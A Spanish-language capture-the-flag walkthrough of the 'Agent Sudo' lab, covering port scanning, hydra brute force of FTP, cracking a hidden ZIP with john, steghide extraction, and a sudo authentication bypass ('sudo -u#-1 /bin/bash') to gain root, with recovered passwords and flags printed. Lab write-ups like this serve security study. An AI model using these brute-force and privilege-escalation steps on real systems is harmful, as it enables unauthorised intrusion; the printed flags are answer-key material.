# Agent Sudo

## Enumeración

Realizamos un escaneo de puertos con `nmap` sobre la víctima para identificar puertos y servicios disponibles:

```bash
sudo nmap -sV -T4 -p- 10.10.130.68
```

Los puertos 21 de FTP, 22 de SSH y 80 de HTTP están abiertos.

![](images/image.png)

Accedemos a la web:

![](images/image-1.png)

Nos dice que en la petición HTTP, en el `User-Agent`, usemos el nombre **R**. Ejecutamos:

```bash
curl http://10.10.130.68/ -H "User-Agent: R" -L
```

Obtenemos el siguiente resultado:

![](images/image-2.png)

Probamos con todas las letras hasta acertar:

![](images/image-3.png)

Nos indica que el usuario `chris` tiene una contraseña débil.

## Ataque de fuerza bruta

Usamos `hydra` sobre FTP con el usuario `chris`:

```bash
hydra 10.10.130.68 -l chris -P /usr/share/wordlists/rockyou.txt ftp
```

La contraseña de `chris` es **crystal**.

![](images/image-4.png)

Accedemos por FTP:

![](images/image-5.png)

Listamos archivos: un `.txt` y dos imágenes.

![](images/image-6.png)

Descargamos con `get`:

![](images/image-7.png)

El `.txt` indica que las fotos son falsas, y que la contraseña está oculta en la imagen.

![](images/image-8.png)

Usamos `binwalk` para extraer el ZIP:

```bash
binwalk cutie.png --extract
```

![](images/image-9.png)

El ZIP está encriptado. Extraemos el hash para `john`:

```bash
zip2john 8702.zip > hash.txt
john hash.txt
```

![](images/image-10.png)
![](images/image-11.png)

John revela la contraseña **alien**.

![](images/image-12.png)

Extraemos el ZIP y obtenemos un código Base64:

![](images/image-13.png)

Decodificamos:

```bash
echo 'QXJlYTUx' | base64 -d
```

![](images/image-14.png)

Con `steghide` extraemos de `cute-alien.jpg`:

```bash
steghide --extract -sf cute-alien.jpg -p Area51
```

Obtenemos credenciales de `james`: **hackerrules!**

![](images/image-15.png)

## Escalada de privilegios

Nos conectamos por SSH como `james`:

```bash
ssh james@10.10.130.68
```

![](images/image-16.png)

Leemos la flag de usuario:

![](images/image-17.png)

```
b03d975e8c92a7c04146cfa7a5a313c7
```

Comprobamos sudo:

```bash
sudo -l
```

![](images/image-18.png)

Vemos que `/bin/bash` es ejecutable sin contraseña en versión vulnerable (<1.8.28). Exploit: [https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)

![](images/image-19.png)

Saltamos auth de sudo:

```bash
sudo -u#-1 /bin/bash
```

Obtenemos la flag root:

![](images/image-20.png)

```
b53a02f55b57d4439e3341834d70c062
```
